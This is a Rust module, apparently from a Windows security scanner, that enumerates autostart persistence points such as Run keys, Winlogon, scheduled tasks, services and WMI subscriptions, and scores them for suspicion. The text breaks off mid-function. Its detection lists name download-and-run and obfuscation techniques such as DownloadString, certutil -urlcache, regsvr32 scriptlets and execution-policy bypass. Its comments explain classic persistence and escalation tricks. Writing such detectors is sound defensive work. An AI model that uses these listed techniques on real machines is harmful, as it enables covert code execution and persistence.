//! Where malware arranges to come back after a reboot.
//!
//! Removing a payload is easy; removing the thing that re-downloads it is the
//! part people miss. This section enumerates the autostart surface that
//! commodity malware actually uses:
//!
//!   * `Run`/`RunOnce` in both hives and both registry views (a 32-bit process
//!     writing to `HKLM\Software\Microsoft\...` lands in `Wow6432Node`, which a
//!     64-bit-only check never sees), plus the `Policies\Explorer\Run` variants
//!   * `Winlogon\Shell` and `Winlogon\Userinit` — replacing these runs code
//!     before the desktop even appears — and `AppInit_DLLs`
//!   * the per-user and all-users Startup folders
//!   * scheduled tasks, judged on where their action points and how obfuscated
//!     its arguments are
//!   * services, judged on binary location and the classic unquoted-path bug
//!   * **WMI permanent event subscriptions**, the fileless persistence spot
//!     that survives a full disk clean and that most consumer tools never look
//!     at
//!
//! Each candidate binary is then checked with `Get-AuthenticodeSignature`. No
//! single signal is damning — plenty of legitimate software is unsigned and
//! lives in `AppData` — so severity comes from the combination: unsigned, plus
//! a non-standard location, plus obfuscated arguments, is the shape of a
//! loader and gets escalated accordingly.
//!
//! Everything below the PowerShell call is a pure function over deserialized
//! rows, which is why the classification logic is testable without Windows.

use serde::{Deserialize, Serialize};

use odysync_core::error::Result;

use super::{is_system_dir, trust_of, Finding, Remediation, Severity, TrustMap};

/// Evidence lists are capped: an inventory finding with 300 lines in it is not
/// evidence, it is a wall the user scrolls past.
const MAX_INVENTORY_EVIDENCE: usize = 40;

// ---------------------------------------------------------------------------
// Wire types
// ---------------------------------------------------------------------------

/// One value under a `Run`-style registry key.
#[derive(Debug, Clone, Default, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "camelCase", default)]
pub struct RunEntry {
    /// Full registry key path, used verbatim as the remediation target.
    pub location: String,
    pub name: String,
    pub command: String,
}

/// The Winlogon values that decide what runs at logon.
#[derive(Debug, Clone, Default, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "camelCase", default)]
pub struct WinlogonEntry {
    pub shell: Option<String>,
    pub userinit: Option<String>,
    pub taskman: Option<String>,
    pub appinit_dlls: Option<String>,
}

/// A file sitting in a Startup folder.
#[derive(Debug, Clone, Default, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "camelCase", default)]
pub struct StartupFile {
    pub path: String,
    pub location: String,
}

/// One `Execute` + `Arguments` pair from a scheduled task.
#[derive(Debug, Clone, Default, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "camelCase", default)]
pub struct TaskAction {
    pub execute: String,
    pub arguments: Option<String>,
}

impl TaskAction {
    /// The full command line, as a user would read it.
    pub fn command_line(&self) -> String {
        match self.arguments.as_deref().map(str::trim) {
            Some(a) if !a.is_empty() => format!("{} {}", self.execute, a),
            _ => self.execute.clone(),
        }
    }
}

#[derive(Debug, Clone, Default, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "camelCase", default)]
pub struct TaskEntry {
    /// Always begins and ends with a backslash, e.g. `\Microsoft\Windows\`.
    pub task_path: String,
    pub task_name: String,
    pub state: Option<String>,
    pub author: Option<String>,
    #[serde(default, deserialize_with = "super::ps_collection")]
    pub actions: Vec<TaskAction>,
}

impl TaskEntry {
    /// Fully-qualified task identifier, as `schtasks` and `Disable-ScheduledTask`
    /// understand it.
    pub fn full_path(&self) -> String {
        format!(
            "{}{}",
            if self.task_path.is_empty() {
                "\\"
            } else {
                &self.task_path
            },
            self.task_name
        )
    }
}

#[derive(Debug, Clone, Default, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "camelCase", default)]
pub struct ServiceEntry {
    pub name: String,
    pub display_name: Option<String>,
    /// Raw `ImagePath`, arguments and all.
    pub path_name: String,
    pub start_mode: Option<String>,
    pub state: Option<String>,
}

/// A row from `root\subscription`: a filter, a consumer, or a binding.
#[derive(Debug, Clone, Default, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "camelCase", default)]
pub struct WmiEntry {
    /// `__EventFilter`, `CommandLineEventConsumer`, `ActiveScriptEventConsumer`,
    /// `__FilterToConsumerBinding`, ...
    pub kind: String,
    pub name: String,
    /// Query text, command template, or script body depending on `kind`.
    pub detail: String,
}

/// Everything the persistence query returns.
#[derive(Debug, Clone, Default, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "PascalCase", default)]
pub struct PersistenceSnapshot {
    #[serde(default, deserialize_with = "super::ps_collection")]
    pub runs: Vec<RunEntry>,
    pub winlogon: Option<WinlogonEntry>,
    #[serde(default, deserialize_with = "super::ps_collection")]
    pub startup: Vec<StartupFile>,
    #[serde(default, deserialize_with = "super::ps_collection")]
    pub tasks: Vec<TaskEntry>,
    #[serde(default, deserialize_with = "super::ps_collection")]
    pub services: Vec<ServiceEntry>,
    #[serde(default, deserialize_with = "super::ps_collection")]
    pub wmi: Vec<WmiEntry>,
}

// ---------------------------------------------------------------------------
// Collection
// ---------------------------------------------------------------------------

/// One script for everything: six PowerShell spawns would cost several seconds
/// and these queries do not depend on each other.
#[cfg(windows)]
const SNAPSHOT_SCRIPT: &str = r#"$ErrorActionPreference='SilentlyContinue'
$runKeys = @(
 'HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run',
 'HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce',
 'HKEY_CURRENT_USER\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run',
 'HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run',
 'HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run',
 'HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce',
 'HKEY_LOCAL_MACHINE\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run',
 'HKEY_LOCAL_MACHINE\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce',
 'HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run'
)
$runs = foreach ($p in $runKeys) {
  $k = Get-Item -LiteralPath ('Registry::' + $p)
  if ($k) {
    foreach ($n in $k.GetValueNames()) {
      [pscustomobject]@{ location = $p; name = [string]$n; command = [string]$k.GetValue($n) }
    }
  }
}
$wl = Get-ItemProperty -LiteralPath 'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon'
$wd = Get-ItemProperty -LiteralPath 'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows'
$winlogon = [pscustomobject]@{
  shell = [string]$wl.Shell; userinit = [string]$wl.Userinit
  taskman = [string]$wl.Taskman; appinitDlls = [string]$wd.AppInit_DLLs
}
$startup = foreach ($d in @([Environment]::GetFolderPath('Startup'), [Environment]::GetFolderPath('CommonStartup'))) {
  if ($d -and (Test-Path -LiteralPath $d)) {
    Get-ChildItem -LiteralPath $d -File -Force | ForEach-Object {
      [pscustomobject]@{ path = $_.FullName; location = $d }
    }
  }
}
$tasks = foreach ($t in (Get-ScheduledTask)) {
  $acts = @(foreach ($a in $t.Actions) {
    if ($a.Execute) { [pscustomobject]@{ execute = [string]$a.Execute; arguments = [string]$a.Arguments } }
  })
  if ($acts.Count -gt 0) {
    [pscustomobject]@{
      taskPath = [string]$t.TaskPath; taskName = [string]$t.TaskName
      state = [string]$t.State; author = [string]$t.Author; actions = $acts
    }
  }
}
$services = foreach ($s in (Get-CimInstance -ClassName Win32_Service)) {
  [pscustomobject]@{
    name = [string]$s.Name; displayName = [string]$s.DisplayName; pathName = [string]$s.PathName
    startMode = [string]$s.StartMode; state = [string]$s.State
  }
}
$wmi = @()
$wmi += foreach ($f in (Get-CimInstance -Namespace root\subscription -ClassName __EventFilter)) {
  [pscustomobject]@{ kind = '__EventFilter'; name = [string]$f.Name; detail = [string]$f.Query }
}
$wmi += foreach ($c in (Get-CimInstance -Namespace root\subscription -ClassName __EventConsumer)) {
  $bits = @($c.CommandLineTemplate, $c.ExecutablePath, $c.ScriptText) | Where-Object { $_ }
  [pscustomobject]@{ kind = [string]$c.CimClass.CimClassName; name = [string]$c.Name; detail = ($bits -join ' | ') }
}
$wmi += foreach ($b in (Get-CimInstance -Namespace root\subscription -ClassName __FilterToConsumerBinding)) {
  [pscustomobject]@{ kind = '__FilterToConsumerBinding'; name = [string]$b.Filter; detail = [string]$b.Consumer }
}
[pscustomobject]@{
  Runs = @($runs); Winlogon = $winlogon; Startup = @($startup)
  Tasks = @($tasks); Services = @($services); Wmi = @($wmi)
} | ConvertTo-Json -Depth 6 -Compress"#;

/// Enumerate the autostart surface and classify it.
#[cfg(windows)]
pub async fn scan() -> Result<Vec<Finding>> {
    use std::time::Duration;

    let stdout = super::ps_query(SNAPSHOT_SCRIPT, Duration::from_secs(180)).await?;
    let snapshot: PersistenceSnapshot = super::parse_ps_object(&stdout).unwrap_or_default();

    // Signature checks are the expensive part, so they happen once for the
    // whole section over a de-duplicated path list rather than per entry.
    let trust = super::query_file_trust(&collect_paths(&snapshot))
        .await
        .unwrap_or_else(|e| {
            tracing::warn!(error = %e, "signature check failed; continuing without it");
            TrustMap::new()
        });

    Ok(analyze(&snapshot, &trust))
}

/// Non-Windows stub: none of these persistence mechanisms exist elsewhere.
#[cfg(not(windows))]
pub async fn scan() -> Result<Vec<Finding>> {
    Ok(Vec::new())
}

/// Every on-disk path referenced by the snapshot, for one batched trust query.
pub fn collect_paths(s: &PersistenceSnapshot) -> Vec<String> {
    let mut paths = Vec::new();
    for r in &s.runs {
        paths.extend(extract_target_path(&r.command));
    }
    for f in &s.startup {
        paths.push(f.path.clone());
    }
    for t in &s.tasks {
        for a in &t.actions {
            paths.extend(extract_target_path(&a.execute));
        }
    }
    for svc in &s.services {
        paths.extend(extract_target_path(&svc.path_name));
    }
    if let Some(w) = &s.winlogon {
        for v in [&w.shell, &w.userinit, &w.taskman].into_iter().flatten() {
            paths.extend(extract_target_path(v));
        }
    }
    paths.retain(|p| !p.trim().is_empty());
    paths
}

// ---------------------------------------------------------------------------
// Pure classification
// ---------------------------------------------------------------------------

/// A pattern in a command line worth mentioning to the user.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub struct Indicator {
    /// What was matched, in words.
    pub label: &'static str,
    /// High-signal patterns are ones with essentially no benign explanation in
    /// an autostart entry. Low-signal ones are suggestive but common.
    pub high_signal: bool,
}

/// Substrings that only ever appear in an autostart entry when someone is
/// hiding something.
const HIGH_SIGNAL: &[(&str, &str)] = &[
    ("-encodedcommand", "base64-encoded PowerShell command"),
    ("-enc ", "base64-encoded PowerShell command"),
    ("/enc ", "base64-encoded PowerShell command"),
    ("frombase64string", "base64 decoding at runtime"),
    ("invoke-expression", "runtime code evaluation (Invoke-Expression)"),
    ("downloadstring", "downloads and runs code from the internet"),
    ("downloadfile", "downloads a file from the internet"),
    ("invoke-webrequest", "fetches content from the internet"),
    ("bitsadmin /transfer", "downloads via bitsadmin"),
    ("certutil -urlcache", "downloads via certutil"),
    ("certutil -decode", "decodes an embedded payload via certutil"),
    ("regsvr32 /i:http", "loads a remote scriptlet via regsvr32"),
    ("scrobj.dll", "runs a script through scrobj.dll"),
    ("[reflection.assembly]::load", "loads .NET assemblies from memory"),
    ("-ep bypass", "bypasses PowerShell execution policy"),
    ("-executionpolicy bypass", "bypasses PowerShell execution policy"),
];

/// Suggestive, but with plenty of legitimate uses.
const LOW_SIGNAL: &[(&str, &str)] = &[
    ("-w hidden", "runs with a hidden window"),
    ("-windowstyle hidden", "runs with a hidden window"),
    ("-nop", "skips the PowerShell profile"),
    ("-noprofile", "skips the PowerShell profile"),
    ("-noninteractive", "runs without a console"),
];

/// Living-off-the-land binaries: shipped with Windows, signed by Microsoft, and
/// therefore a convenient way to run arbitrary code while looking legitimate.
const LOLBINS: &[&str] = &[
    "powershell.exe",
    "pwsh.exe",
    "cmd.exe",
    "wscript.exe",
    "cscript.exe",
    "mshta.exe",
    "rundll32.exe",
    "regsvr32.exe",
    "msbuild.exe",
    "installutil.exe",
    "certutil.exe",
    "bitsadmin.exe",
    "curl.exe",
    "conhost.exe",
];

/// Extensions that mean "this is executable code".
const EXECUTABLE_EXTS: &[&str] = &[
    ".exe", ".dll", ".bat", ".cmd", ".com", ".scr", ".ps1", ".vbs", ".vbe", ".js", ".jse", ".wsf",
    ".wsh", ".msi", ".pif", ".hta", ".cpl", ".sys",
];

/// Pull the executable path out of a command line.
///
/// Registry autostart values are not argv — they are a single string that
/// Windows parses, and the two hard cases are quoted paths containing spaces
/// and unquoted paths containing spaces. The rule used here: a leading quote
/// delimits the path; otherwise the path ends at the first executable
/// extension that is followed by a separator. Falling back to the first
/// whitespace-delimited token would silently truncate
/// `C:\Program Files\App\a.exe`.
pub fn extract_target_path(command: &str) -> Option<String> {
    let c = command.trim();
    if c.is_empty() {
        return None;
    }

    if let Some(rest) = c.strip_prefix('"') {
        let end = rest.find('"')?;
        let p = rest[..end].trim();
        // Expanded here so every caller — existence checks, Authenticode
        // lookups, system-directory tests — sees a real path rather than
        // `%SystemRoot%\...`, which resolves to nothing.
        return (!p.is_empty()).then(|| super::expand_env_vars(p));
    }

    let lower = c.to_ascii_lowercase();
    let mut best: Option<usize> = None;
    for ext in EXECUTABLE_EXTS {
        let mut from = 0;
        while let Some(idx) = lower[from..].find(ext) {
            let end = from + idx + ext.len();
            let next = lower[end..].chars().next();
            if matches!(
                next,
                None | Some(' ') | Some('\t') | Some(',') | Some('"') | Some('\'') | Some(';')
            ) {
                best = Some(best.map_or(end, |b: usize| b.min(end)));
                break;
            }
            from = from + idx + ext.len();
        }
    }

    if let Some(end) = best {
        let p = c[..end].trim();
        return (!p.is_empty()).then(|| super::expand_env_vars(p));
    }

    c.split_whitespace()
        .next()
        .map(|s| super::expand_env_vars(s.trim_matches('"')))
        .filter(|s| !s.is_empty())
}

/// True when `needle` appears in `haystack` as a standalone token rather than
/// inside a longer word — `iex` must not match `Fiex.exe`.
fn contains_token(haystack_lower: &str, needle: &str) -> bool {
    let mut from = 0;
    while let Some(idx) = haystack_lower[from..].find(needle) {
        let start = from + idx;
        let end = start + needle.len();
        let before_ok = start == 0
            || !haystack_lower[..start]
                .chars()
                .next_back()
                .is_some_and(|c| c.is_alphanumeric() || c == '-' || c == '_');
        let after_ok = !haystack_lower[end..]
            .chars()
            .next()
            .is_some_and(|c| c.is_alphanumeric() || c == '_');
        if before_ok && after_ok {
            return true;
        }
        from = end;
    }
    false
}

/// Everything suspicious about a command line, de-duplicated.
pub fn command_indicators(command: &str) -> Vec<Indicator> {
    let lower = command.to_ascii_lowercase();
    let mut out: Vec<Indicator> = Vec::new();
    let mut push = |label: &'static str, high_signal: bool| {
        if !out.iter().any(|i| i.label == label) {
            out.push(Indicator { label, high_signal });
        }
    };

    for (pat, label) in HIGH_SIGNAL {
        if lower.contains(pat) {
            push(label, true);
        }
    }
    // `iex` is an alias, so it needs a token match rather than a substring one.
    if contains_token(&lower, "iex") {
        push("runtime code evaluation (Invoke-Expression)", true);
    }
    // PowerShell accepts any unambiguous prefix of -EncodedCommand, so `-e`,
    // `-ec` and `-en` all work and none of them match the literal patterns
    // above. The payload itself is the reliable tell: base64 of UTF-16LE text
    // has a small, recognisable set of leading characters.
    if command.split_whitespace().any(looks_like_utf16_base64) {
        push("base64-encoded PowerShell command", true);
    }
    for (pat, label) in LOW_SIGNAL {
        if lower.contains(pat) {
            push(label, false);
        }
    }
    out
}

/// True for a token that looks like base64-encoded UTF-16LE PowerShell.
///
/// Encoding ASCII as UTF-16LE puts a zero byte after every character, which
/// constrains the base64 output enough to recognise: `$` becomes `JAB`, `I`
/// becomes `SQB`, `i` becomes `aQB`, `(` becomes `KAB`, `W` becomes `VwB`, and
/// so on. Requiring a long, pure-base64 token as well keeps this from firing on
/// ordinary words.
pub fn looks_like_utf16_base64(token: &str) -> bool {
    let t = token.trim_end_matches('=');
    if t.len() < 16 {
        return false;
    }
    if !t
        .chars()
        .all(|c| c.is_ascii_alphanumeric() || c == '+' || c == '/')
    {
        return false;
    }
    const PREFIXES: &[&str] = &[
        "JAB", "SQB", "aQB", "KAB", "VwB", "cwB", "dwB", "SeB", "PAB", "IAB", "RwB", "TgB", "cAB",
        "ZQB", "bgB", "YwB", "ZgB", "aAB", "dAB", "bQB",
    ];
    PREFIXES.iter().any(|p| t.starts_with(p))
}

/// True when any indicator has essentially no benign explanation.
pub fn has_high_signal(indicators: &[Indicator]) -> bool {
    indicators.iter().any(|i| i.high_signal)
}

/// Render indicators as evidence lines.
fn indicator_evidence(indicators: &[Indicator]) -> Vec<String> {
    indicators
        .iter()
        .map(|i| format!("suspicious: {}", i.label))
        .collect()
}

/// True when the executable is one of the Windows binaries attackers borrow.
pub fn is_lolbin(path: &str) -> bool {
    let p = super::normalize_path(path);
    let file = p.rsplit('\\').next().unwrap_or(&p);
    LOLBINS.contains(&file)
}

/// True for the classic unquoted-service-path privilege escalation: an
/// unquoted `ImagePath` whose directory names contain spaces, so Windows will
/// try `C:\Program.exe` before `C:\Program Files\Sub Dir\svc.exe`.
pub fn has_unquoted_path_with_spaces(path_name: &str) -> bool {
    let p = path_name.trim();
    if p.is_empty() || p.starts_with('"') {
        return false;
    }
    // Only the executable portion matters; arguments after it are irrelevant.
    let Some(exe) = extract_target_path(p) else {
        return false;
    };
    if !exe.contains(' ') {
        return false;
    }
    // Drivers and anything under \SystemRoot are launched differently and are
    // not affected by the search-order bug.
    let lower = exe.to_ascii_lowercase();
    !lower.starts_with("\\systemroot") && !lower.starts_with("\\??\\")
}

/// The file extension, lowercased, including the dot.
fn extension_of(path: &str) -> String {
    let p = super::normalize_path(path);
    match p.rfind('.') {
        Some(i) if !p[i..].contains('\\') => p[i..].to_string(),
        _ => String::new(),
    }
}

/// Build a "what do we know about this file" evidence line.
fn trust_evidence(trust: &TrustMap, path: &str) -> (Option<String>, bool, bool) {
    match trust_of(trust, path) {
        Some(t) => (
            Some(format!("{path} — {}", t.describe())),
            t.unsigned(),
            !t.exists,
        ),
        None => (Some(path.to_string()), false, false),
    }
}

/// Classify the whole snapshot.
pub fn analyze(s: &PersistenceSnapshot, trust: &TrustMap) -> Vec<Finding> {
    let mut out = Vec::new();
    out.extend(analyze_runs(&s.runs, trust));
    if let Some(w) = &s.winlogon {
        out.extend(analyze_winlogon(w));
    }
    out.extend(analyze_startup(&s.startup, trust));
    out.extend(analyze_tasks(&s.tasks, trust));
    out.extend(analyze_services(&s.services, trust));
    out.extend(analyze_wmi(&s.wmi));
    out
}

/// Registry autostart values.
pub fn analyze_runs(runs: &[RunEntry], trust: &TrustMap) -> Vec<Finding> {
    let mut out = Vec::new();

    for r in runs {
        let indicators = command_indicators(&r.command);
        let target = extract_target_path(&r.command);
        let mut evidence = vec![format!("{}\\{} = {}", r.location, r.name, r.command)];
        let mut severity = Severity::Info;
        let mut reasons: Vec<String> = Vec::new();

        if let Some(path) = &target {
            let (line, unsigned, missing) = trust_evidence(trust, path);
            if let Some(line) = line {
                evidence.push(line);
            }
            if missing {
                // Stale rather than dangerous: nothing executes. Worth
                // cleaning up, not worth alarming about.
                severity = severity.escalate(Severity::Low);
                reasons.push(
                    "it points at a file that no longer exists, which usually means \
                     something was removed but its autostart entry was left behind"
                        .to_string(),
                );
            } else if unsigned && !is_system_dir(path) {
                // See the scheduled-task rule: unsigned software outside the
                // system directories is the norm for games, launchers and
                // anything self-built, and per-user installs under C:\Users are
                // how most software ships now. Recorded as context, not scored.
                reasons.push(
                    "the program it launches is unsigned and lives outside the \
                     protected system directories"
                        .to_string(),
                );
            }
            if is_lolbin(path) && !indicators.is_empty() {
                severity = severity.escalate(Severity::High);
                reasons.push(
                    "it launches a built-in Windows scripting tool rather than an \
                     application, which is how attackers run code without dropping \
                     an obvious executable"
                        .to_string(),
                );
            }
        }

        if has_high_signal(&indicators) {
            severity = severity.escalate(Severity::High);
            reasons.push(
                "its command line is obfuscated or downloads code at startup"
                    .to_string(),
            );
            // Obfuscated *and* unsigned/non-standard is a loader, full stop.
            if severity == Severity::High
                && target.as_deref().is_some_and(|p| !is_system_dir(p))
            {
                severity = Severity::Critical;
            }
        }

        if severity == Severity::Info {
            continue;
        }

        evidence.extend(indicator_evidence(&indicators));
        out.push(
            Finding::new(
                format!("persistence-run:{}\\{}", r.location, r.name),
                severity,
                "persistence",
                format!("Autostart entry \"{}\" looks suspicious", r.name),
                format!(
                    "This registry value runs every time you log in. It was flagged because {}. \
                     If you do not recognise the program, disabling the entry stops it from \
                     starting without deleting anything.",
                    join_reasons(&reasons)
                ),
            )
            .with_evidence(evidence)
            .with_remediation(Remediation::DisableRunKey {
                hive: r.location.clone(),
                name: r.name.clone(),
            }),
        );
    }

    // An inventory line so the user can eyeball the rest themselves. Autostart
    // entries are exactly the kind of thing a human recognises instantly and a
    // heuristic never will.
    if !runs.is_empty() {
        let evidence: Vec<String> = runs
            .iter()
            .take(MAX_INVENTORY_EVIDENCE)
            .map(|r| format!("{}\\{} = {}", r.location, r.name, r.command))
            .collect();
        out.push(
            Finding::new(
                "persistence-run-inventory",
                Severity::Info,
                "persistence",
                format!("{} programs start automatically at logon", runs.len()),
                "None of these tripped a heuristic, but you know what you installed \
                 and this tool does not. Read the list — anything you do not \
                 recognise is worth looking up.",
            )
            .with_evidence(evidence),
        );
    }

    out
}

fn join_reasons(reasons: &[String]) -> String {
    match reasons.len() {
        0 => "of an unusual combination of properties".to_string(),
        1 => reasons[0].clone(),
        _ => format!(
            "{} and {}",
            reasons[..reasons.len() - 1].join(", "),
            reasons[reasons.len() - 1]
        ),
    }
}

/// The stock value of `Winlogon\Shell`.
const DEFAULT_SHELL: &str = "explorer.exe";

/// Logon-path tampering. These values are stable across every Windows install,
/// so any deviation is worth a loud finding.
pub fn analyze_winlogon(w: &WinlogonEntry) -> Vec<Finding> {
    let mut out = Vec::new();

    if let Some(shell) = w.shell.as_deref().map(str::trim).filter(|s| !s.is_empty()) {
        if !shell.eq_ignore_ascii_case(DEFAULT_SHELL) {
            out.push(
                Finding::new(
                    "persistence-winlogon-shell",
                    Severity::Critical,
                    "persistence",
                    "The Windows logon shell has been replaced",
                    "`Winlogon\\Shell` decides what program becomes your desktop when \
                     you log in. It should say exactly `explorer.exe`. Anything else \
                     runs before and alongside your desktop, with your full \
                     privileges, every single time you log in.",
                )
                .with_evidence(vec![format!("Winlogon\\Shell = {shell}")])
                .with_remediation(Remediation::Manual {
                    instructions: "Set HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\\
                         Winlogon\\Shell back to explorer.exe, then investigate the program \
                         it was pointing at. Because this key needs administrator rights to \
                         write, its modification means something ran elevated on this machine."
                        .into(),
                }),
            );
        }
    }

    if let Some(userinit) = w
        .userinit
        .as_deref()
        .map(str::trim)
        .filter(|s| !s.is_empty())
    {
        if !is_default_userinit(userinit) {
            out.push(
                Finding::new(
                    "persistence-winlogon-userinit",
                    Severity::Critical,
                    "persistence",
                    "The Winlogon Userinit value has extra programs in it",
                    "`Userinit` normally lists only `userinit.exe`. Appending a second \
                     program after a comma is a long-standing persistence trick: the \
                     extra program runs at every logon, before the desktop appears.",
                )
                .with_evidence(vec![format!("Winlogon\\Userinit = {userinit}")])
                .with_remediation(Remediation::Manual {
                    instructions: "Restore Userinit to C:\\Windows\\system32\\userinit.exe, \
                         (including the trailing comma) and investigate anything else that \
                         was listed."
                        .into(),
                }),
            );
        }
    }

    if let Some(taskman) = w.taskman.as_deref().map(str::trim).filter(|s| !s.is_empty()) {
        out.push(
            Finding::new(
                "persistence-winlogon-taskman",
                Severity::High,
                "persistence",
                "A replacement Task Manager is configured",
                "The `Taskman` value is empty on a stock Windows install. When set, the \
                 named program runs instead of Task Manager — which both persists and \
                 stops you from inspecting running processes.",
            )
            .with_evidence(vec![format!("Winlogon\\Taskman = {taskman}")]),
        );
    }

    if let Some(dlls) = w
        .appinit_dlls
        .as_deref()
        .map(str::trim)
        .filter(|s| !s.is_empty())
    {
        out.push(
            Finding::new(
                "persistence-appinit-dlls",
                Severity::High,
                "persistence",
                "AppInit_DLLs is set",
                "Every DLL listed here is loaded into almost every process that uses \
                 the standard Windows UI libraries. It is a legacy hooking mechanism \
                 that modern software does not need, and injecting through it is a \
                 classic way to be inside every application at once.",
            )
            .with_evidence(vec![format!("AppInit_DLLs = {dlls}")]),
        );
    }

    out
}

/// True for the stock `Userinit` value, with or without its trailing comma.
pub fn is_default_userinit(value: &str) -> bool {
    let v = super::normalize_path(value.trim().trim_end_matches(','));
    // Accept any drive letter; the system drive is not always C:.
    let tail = super::strip_drive(&v);
    tail == "\\windows\\system32\\userinit.exe" || v == "userinit.exe"
}

/// Files dropped into a Startup folder.
pub fn analyze_startup(files: &[StartupFile], trust: &TrustMap) -> Vec<Finding> {
    let mut out = Vec::new();
    for f in files {
        let ext = extension_of(&f.path);
        // Shortcuts are the normal contents of a Startup folder.
        if ext == ".lnk" || ext == ".ini" || ext.is_empty() {
            continue;
        }
        let scripty = matches!(
            ext.as_str(),
            ".bat" | ".cmd" | ".ps1" | ".vbs" | ".vbe" | ".js" | ".jse" | ".wsf" | ".hta"
        );
        if !scripty && !EXECUTABLE_EXTS.contains(&ext.as_str()) {
            continue;
        }

        let (line, unsigned, _) = trust_evidence(trust, &f.path);
        let mut severity = if scripty {
            Severity::High
        } else {
            Severity::Medium
        };
        if unsigned {
            severity = severity.escalate(Severity::High);
        }

        out.push(
            Finding::new(
                format!("persistence-startup:{}", super::normalize_path(&f.path)),
                severity,
                "persistence",
                format!(
                    "{} in the Startup folder",
                    if scripty { "Script" } else { "Program" }
                ),
                if scripty {
                    "A script in the Startup folder runs at every logon. Installers \
                     essentially never do this — they place a shortcut instead — so a \
                     loose script here is worth opening in Notepad and reading before \
                     anything else."
                        .to_string()
                } else {
                    "An executable placed directly in the Startup folder runs at every \
                     logon. Legitimate software normally puts a shortcut here instead."
                        .to_string()
                },
            )
            .with_evidence(line.into_iter().chain([format!("folder: {}", f.location)]).collect::<Vec<_>>())
            .with_remediation(Remediation::DeleteFile {
                path: f.path.clone(),
            }),
        );
    }
    out
}

/// Scheduled tasks. Microsoft's own tasks live under `\Microsoft\Windows\` and
/// point into `C:\Windows`, so the location rule excludes them naturally — no
/// name-based allowlist that malware could simply impersonate.
pub fn analyze_tasks(tasks: &[TaskEntry], trust: &TrustMap) -> Vec<Finding> {
    let mut out = Vec::new();

    for t in tasks {
        for (i, action) in t.actions.iter().enumerate() {
            let command = action.command_line();
            let indicators = command_indicators(&command);
            let target = extract_target_path(&action.execute);
            let outside = target.as_deref().is_some_and(|p| !is_system_dir(p));

            let mut severity = Severity::Info;
            let mut reasons: Vec<String> = Vec::new();
            let mut evidence = vec![format!("{} -> {}", t.full_path(), command)];

            if let Some(path) = &target {
                let (line, unsigned, missing) = trust_evidence(trust, path);
                if let Some(line) = line {
                    evidence.push(line);
                }
                // "Runs from outside C:\Windows" is context, not a signal:
                // it describes almost every third-party scheduled task on a
                // normal machine — games, launchers, updaters, self-built
                // tools. Treating it as Medium on its own produced dozens of
                // findings and buried the handful that mattered. It only
                // counts in combination with something else.
                if outside {
                    reasons.push(
                        "it runs a program from outside the protected system \
                         directories"
                            .to_string(),
                    );
                }
                if unsigned && outside {
                    // Unsigned is weak alone, and "user-writable" is no longer
                    // a signal either: per-user installs under C:\Users are how
                    // Discord, Spotify, Teams and most modern software ship,
                    // and anything self-built is unsigned by definition.
                    // Reported, never scored — it takes a real indicator
                    // (obfuscation, a LOLBin, a masquerading name) to make this
                    // actionable.
                    reasons.push("that program is unsigned".to_string());
                }
                if missing {
                    severity = severity.escalate(Severity::Low);
                    reasons.push("the program it runs no longer exists".to_string());
                }
                if is_lolbin(path) && !indicators.is_empty() {
                    severity = severity.escalate(Severity::High);
                    reasons.push(
                        "it drives a built-in Windows scripting tool with unusual \
                         arguments"
                            .to_string(),
                    );
                }
            }

            if has_high_signal(&indicators) {
                severity = severity.escalate(Severity::High);
                reasons
                    .push("its arguments are obfuscated or fetch code from the internet".to_string());
                if outside || is_lolbin(target.as_deref().unwrap_or("")) {
                    severity = Severity::Critical;
                }
            }

            if severity == Severity::Info {
                continue;
            }

            if let Some(author) = t.author.as_deref().filter(|a| !a.trim().is_empty()) {
                evidence.push(format!("author: {author}"));
            }
            if let Some(state) = t.state.as_deref().filter(|s| !s.trim().is_empty()) {
                evidence.push(format!("state: {state}"));
            }
            evidence.extend(indicator_evidence(&indicators));

            out.push(
                Finding::new(
                    format!("persistence-task:{}#{i}", t.full_path()),
                    severity,
                    "persistence",
                    format!("Scheduled task \"{}\" looks suspicious", t.task_name),
                    format!(
                        "Scheduled tasks run on a trigger — at logon, on a timer, or when \
                         the machine is idle — and are one of the most common ways malware \
                         survives a reboot. This one was flagged because {}.",
                        join_reasons(&reasons)
                    ),
                )
                .with_evidence(evidence)
                .with_remediation(Remediation::DisableScheduledTask {
                    task_path: t.full_path(),
                }),
            );
        }
    }

    out
}

/// Services: where the binary lives, whether it is signed, and the unquoted
/// path bug.
pub fn analyze_services(services: &[ServiceEntry], trust: &TrustMap) -> Vec<Finding> {
    let mut out = Vec::new();

    for s in services {
        let target = extract_target_path(&s.path_name);
        let outside = target.as_deref().is_some_and(|p| !is_system_dir(p));

        if outside {
            let path = target.clone().unwrap_or_default();
            let (line, unsigned, missing) = trust_evidence(trust, &path);
            let mut severity = Severity::Low;
            let mut reasons = vec![
                "its executable is outside C:\\Windows and Program Files".to_string(),
            ];
            if unsigned {
                severity = Severity::High;
                reasons.push("and is unsigned".to_string());
            }
            if super::is_user_writable_dir(&path) {
                severity = severity.escalate(Severity::High);
                reasons.push(
                    "and sits in a directory any program can write to, so it can be \
                     swapped out without administrator rights"
                        .to_string(),
                );
            }
            if missing {
